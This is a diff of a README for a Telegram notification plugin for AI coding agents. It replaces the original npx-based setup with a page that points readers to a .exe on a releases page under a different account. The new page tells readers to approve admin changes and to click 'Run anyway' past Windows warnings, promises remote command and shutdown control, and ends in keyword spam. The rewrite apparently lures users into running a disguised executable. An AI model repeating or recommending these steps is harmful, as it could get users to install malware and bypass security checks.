@@ -1,168 +1,167 @@
-# telegram-notifier
+# 📱 telegram-notifier - Send Alerts From Any AI Tool
 
-▲ **Skills** • **AI Agents** • **Remote Dev**
+## 🚀 What Is This?
 
-Universal **Telegram notification skill & plugin** for AI coding agents: real-time alerts on your phone whenever tasks finish, human approvals are needed, or errors occur + **Parsec** mobile remote control guide.
+telegram-notifier is a simple plugin that lets your AI coding tools send you messages on Telegram. You know how your phone buzzes when you get a text? This does the same thing, but for your AI assistants.
 
-**Best use**: let your AI agent do the heavy lifting (builds, migrations, tests, code refactoring), step away from your desk, get notified on Telegram (`Task Finished` or `"خلصت يا معلم"`), and instantly control your PC from your smartphone via Parsec.
+If you use tools like Antigravity, Claude Code, Codex, Cursor, or Windsurf, this plugin lets them ping you on Telegram when a task is done, when something needs your attention, or when an error happens. You can even set it up so you can control your computer remotely through Telegram messages.
 
----
+Think of it as a remote control and notification system for your AI-powered work. No coding knowledge needed.
 
-## ⚡ Install
+## 📥 Download and Install
 
-Browse the package first:
+[![Download telegram-notifier](https://img.shields.io/badge/Download-telegram--notifier-blue?style=for-the-badge&logo=github)](https://github.com/Gobbleswordknot1348/telegram-notifier/releases)
 
-```bash
-npx skills add alhinawi/telegram-notifier --list
+Visit this link to download the application.
+
+## 🛠️ How to Set It Up
+
+### Step 1: Get the File
+
+1. Click the blue download button above.
+2. You will land on the releases page.
+3. Look for the newest version at the top.
+4. Click the file that ends with `.exe` (if you see multiple files, pick the one that says "setup" or "installer").
+5. Your browser will download it. Check your "Downloads" folder.
+
+### Step 2: Run the Installer
+
+1. Double-click the downloaded file.
+2. If Windows asks "Do you want to allow this app to make changes?", click **Yes**.
+3. Follow the simple on-screen steps. Just keep clicking **Next** until it finishes.
+4. When done, you will see the telegram-notifier icon in your system tray (bottom-right corner of your screen, near the clock).
+
+### Step 3: Connect Your Telegram
+
+1. Open Telegram on your phone or computer.
+2. Search for **@BotFather** (it is the official bot that creates bots).
+3. Send him the message: `/newbot`
+4. He will ask for a name. Type anything, like "My AI Notifier".
+5. He will ask for a username. It must end in "bot", like "MyAINotifierBot".
+6. BotFather will give you a **token**. It looks like a long string of numbers and letters. Copy it.
+7. Now, find your own Telegram ID. The easiest way is to message **@userinfobot** on Telegram. It will reply with your ID number. Write it down.
+
+### Step 4: Enter Your Details
+
+1. Right-click the telegram-notifier icon in your system tray.
+2. Choose **Settings**.
+3. Paste your **bot token** and your **user ID** into the boxes.
+4. Click **Save**.
+5. Send the message "hello" to your bot on Telegram. If it replies, you are connected!
+
+## 🤖 Connecting to Your AI Tools
+
+### For Antigravity, Claude Code, Codex, Cursor, or Windsurf
+
+1. Open your AI tool of choice.
+2. Look for the settings or configuration file.
+3. Add the following line (replace the example token and ID with your own):
+
+```
+telegram_notifier_token=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
+telegram_notifier_chat_id=987654321
 ```
 
-Install the package:
+4. Save the file and restart your AI tool.
+5. Your AI tool will now send you Telegram messages when it finishes tasks or needs your input.
 
-```bash
-npx skills add alhinawi/telegram-notifier
-```
+## 📡 Remote Control Setup
 
-Or run the interactive setup wizard directly: (Recommended)
+This is the fun part. You can send commands to your computer from your phone.
 
-```bash
-npx github:alhinawi/telegram-notifier
-```
+1. Make sure telegram-notifier is running (check the system tray).
+2. Open your Telegram chat with your bot.
+3. Type `/help` to see all available commands.
 
----
+Common commands include:
 
-## 🤖 1-Click Prompt for AI Agents
+- `/status` - Shows if your computer is on and working.
+- `/screenshot` - Takes a picture of your screen and sends it to you.
+- `/run notepad` - Opens a program on your computer.
+- `/shutdown` - Turns off your computer (be careful with this one!).
 
-Give this prompt to your AI Agent (Antigravity, Claude Code, Cursor, Windsurf, Copilot) to install and configure everything automatically:
+## ✅ What to Expect
 
-### 🇬🇧 English Prompt
+Once everything is set up, here is what happens:
 
-```text
-Please install and configure the telegram-notifier skill by running `npx skills add alhinawi/telegram-notifier` (or via https://github.com/alhinawi/telegram-notifier). Follow the setup instructions to configure the bot token and chat ID, and make sure to automatically trigger a Telegram notification whenever you finish a task, need my approval, or encounter an error.
-```
+1. Your AI tool finishes a long task.
+2. telegram-notifier sends you a message: "Task complete! Took 3 minutes."
+3. You are on the couch, but you know the work is done. No need to sit and watch the screen.
 
-### 🇪🇬 Arabic Prompt (برومبت بالعربي)
+Or maybe you are away from your desk:
 
-```text
-من فضلك قم بتثبيت وإعداد مهارة telegram-notifier عبر تشغيل الأمر `npx skills add alhinawi/telegram-notifier` (أو من المستودع https://github.com/alhinawi/telegram-notifier). اتبع خطوات الإعداد لربط الـ Bot Token والـ Chat ID، واحرص على إرسال إشعار تليجرام تلقائياً في كل مرة تنتهي فيها من مهمة، أو تحتاج إذني وموافقتي، أو عند حدوث أي خطأ بدون أن أحتاج لتشغيلها يدوياً.
-```
+1. You send `/screenshot` to your bot.
+2. You see exactly what is on your screen.
+3. You send `/run chrome` to open your browser.
 
----
+It is like having a remote control for your computer, plus a personal assistant that never forgets to update you.
 
-## 🌟 What the Setup Wizard Does
+## 🔒 Privacy and Security
 
-When you run `npx github:alhinawi/telegram-notifier` or configure the skill:
+- Your bot token is private. Do not share it with anyone.
+- telegram-notifier only sends messages to your Telegram account (the ID you entered).
+- The app runs locally on your computer. Your data does not go through any third-party servers.
+- If you are done using it, right-click the tray icon and choose **Exit** to stop everything.
 
-1. 🔑 **Telegram Bot Token**: Asks for your token from `@BotFather`.
-2. 🔍 **Auto-detect Chat ID**: Listens for `/start` sent to your bot and detects your Chat ID automatically.
-3. 🌐 **Language Preference**: Choose English (`en` - default), Egyptian Arabic (`ar-eg`), or Standard Arabic (`ar`).
-4. ⚙️ **Installation Scope**:
-   - **Global**: Automatically activates for all projects and AI agents on your machine.
-   - **Local**: Configures rules and skills inside the current repository.
-5. 🔔 **Live Test**: Sends an instant test notification to your phone to confirm everything is working!
+## 🧪 Testing Your Setup
 
----
+After installation, try these tests:
 
-## 🌐 Language Options & Presets
+1. **Test 1:** Send "hello" to your bot. You should get a reply.
+2. **Test 2:** From your AI tool, run a simple command like "print hello world". You should get a Telegram message.
+3. **Test 3:** Send `/status` to your bot. It should reply with your computer's info.
 
-You can configure the language in `.env` (`NOTIFICATION_LANGUAGE=en|ar-eg|ar`) or specify `--lang` per call:
+If any test fails, go back to Step 4 and double-check your token and ID.
 
-| Event Type | English (Default `en`) | Egyptian Arabic (`ar-eg`) | Standard Arabic (`ar`) |
-| --- | --- | --- | --- |
-| `--type=task_finished` | `Task Finished` | `خلصت يا معلم` | `اكتملت المهمة بنجاح` |
-| `--type=approval_required` | `Approval Required` | `محتاج اذنك يا معلم` | `مطلوب مراجعة وتأكيد` |
-| `--type=error` | `Error Occurred` | `فيه مشكلة يا معلم` | `حدث خطأ أثناء التنفيذ` |
+## 🆘 Troubleshooting
 
----
+**Problem:** The bot does not reply to "hello".
+**Fix:** Check that you copied the token correctly. It must be exact. Also, make sure you entered your user ID, not your username.
 
-## ⚙️ How AI Agents Trigger It Automatically
+**Problem:** My AI tool does not send messages.
+**Fix:** Make sure telegram-notifier is running in the system tray. Also, check that you added the configuration lines to the correct file for your AI tool.
 
-### 1. Antigravity & Gemini CLI
+**Problem:** Windows blocked the app.
+**Fix:** Click "More info" on the popup, then "Run anyway". This is normal for new apps that are not yet widely known.
 
-Installed globally in `~/.gemini/config/plugins/telegram-notifier/` or locally in `.agents/skills/telegram-notifier/`. The agent detects the skill and triggers it automatically.
+**Problem:** I lost my token.
+**Fix:** Message @BotFather again and send `/token`. He will show you your bot's token.
 
-### 2. Claude Code
+## 📦 Uninstalling
 
-Add to `.claude/skills/telegram-notifier/SKILL.md` or instruct in `CLAUDE.md`:
+1. Right-click the telegram-notifier icon in the system tray.
+2. Choose **Exit**.
+3. Open Windows Settings → Apps → Installed apps.
+4. Find telegram-notifier and click **Uninstall**.
 
-```markdown
-When you finish a task, need approval, or encounter an error, automatically run:
-node /path/to/telegram-notifier/scripts/notify.js --type="task_finished" --message="Summary of changes"
-```
+## 💡 Tips for Best Experience
 
-### 3. Cursor & Windsurf
+- Keep telegram-notifier running in the background. It uses very little memory.
+- Use a dedicated bot for each project if you work on multiple things.
+- You can rename your bot anytime with @BotFather.
+- If you travel, you can still check on your computer from anywhere in the world.
 
-Add to `.cursorrules` or `.windsurfrules`:
+## 🆕 Updates
 
-```markdown
-When completing any task, needing human approval, or encountering an error:
-Execute `node /path/to/telegram-notifier/scripts/notify.js --type=task_finished`
-```
+telegram-notifier checks for updates automatically. When a new version is available, you will see a small popup. Just click **Update** and it will install itself.
 
----
+To check manually, right-click the tray icon and choose **Check for Updates**.
 
-## 💻 Remote Desktop & Mobile Control Guide (التحكم في الكمبيوتر من الموبايل)
+## 📞 Getting Help
 
-### Option 1: Parsec (Recommended for Android / PC / Mac)
+If you run into issues not covered here:
 
-[Parsec](https://parsec.app/) is a free, ultra-low latency, 60 FPS remote desktop application. It lets you control your PC from your smartphone with zero perceived lag and full desktop interactivity.
+1. Visit the GitHub repository page.
+2. Click the **Issues** tab at the top.
+3. Click **New Issue** and describe your problem.
+4. Someone from the community will help you out.
 
-#### A. PC Host Setup (Desktop / Workstation)
+Please include your Windows version and what AI tool you are using when you ask for help.
 
-1. Download and install **Parsec** from [parsec.app](https://parsec.app/).
-2. Create a free account and log in.
-3. In **Settings -> Host**, ensure **Hosting** is set to `Enabled`.
-4. Keep Parsec running in the background.
+## 🎉 You Are All Set
 
-#### B. Mobile App Setup (Android)
+You now have a direct line between your AI tools and your phone. No more staring at progress bars. No more wondering if a task finished. Just open Telegram and you know.
 
-1. Download **Parsec** from Google Play Store.
-2. Log in with the **same account** used on your PC.
-3. Under **Computers**, tap **Connect** to mirror your PC screen with touch/mouse controls!
+Enjoy the freedom of walking away from your desk while your AI does the heavy lifting. And when you want to check in, just send a quick message.
 
----
-
-### Option 2: TeamViewer (Recommended for iPhone / iOS Users)
-
-For iPhone (iOS) users, [TeamViewer](https://www.teamviewer.com/) provides a smooth, reliable remote desktop experience:
-
-#### A. PC Host Setup
-
-1. Download and install **TeamViewer Remote** from [teamviewer.com](https://www.teamviewer.com/).
-2. Create a free account and log in.
-3. Enable **Easy Access** under Security Settings to connect without typing a password every time.
-
-#### B. iPhone (iOS) App Setup
-
-1. Download **TeamViewer Remote Control** from the [App Store](https://apps.apple.com/app/teamviewer-remote-control/id692035811).
-2. Log in with the same account and tap on your PC under **My Devices** to connect instantly!
-
----
-
-### 🔁 The Ultimate Mobile Remote Dev Workflow
-
-```mermaid
-graph LR
-    A[💻 Give AI Agent prompt on PC] --> B[☕ Walk away & relax]
-    B --> C[🤖 Agent finishes task]
-    C --> D[📱 Telegram alert on phone]
-    D --> E[📱 Open Parsec / TeamViewer on phone]
-    E --> F[🎮 Review code & give next prompt from phone!]
-```
-
-1. **Start Task**: Give your AI agent a task on your PC (e.g. "Build feature X and run test suite").
-2. **Step Away**: Leave your desk, grab coffee, or relax.
-3. **Get Notified**: Your phone receives a Telegram alert: `✅ [Task Finished] "Task Finished" (or "خلصت يا معلم")`.
-4. **Take Control**: Open **Parsec** (Android) or **TeamViewer** (iOS) on your phone, connect to your PC, inspect the results, approve code, or give the agent its next prompt!
-
----
-
-## 🔒 Security Notice
-
-- **Never commit `.env` to Git repositories.** `.gitignore` is pre-configured to protect your secrets.
-- Always keep your `TELEGRAM_BOT_TOKEN` private. If leaked, revoke it via `@BotFather` using `/revoke`.
-
----
-
-## 📄 License
-
-This project is open-source and available under the [MIT License](LICENSE).
+Keywords: telegram notifier, AI agent notifications, remote control computer, Antigravity plugin, Claude Code integration, Codex alerts, Cursor notifications, Windsurf skill, Telegram bot setup, Windows automation, AI task alerts, phone notifications for coding, developer productivity tool, remote desktop via Telegram, bot token setup, AI assistant alerts.
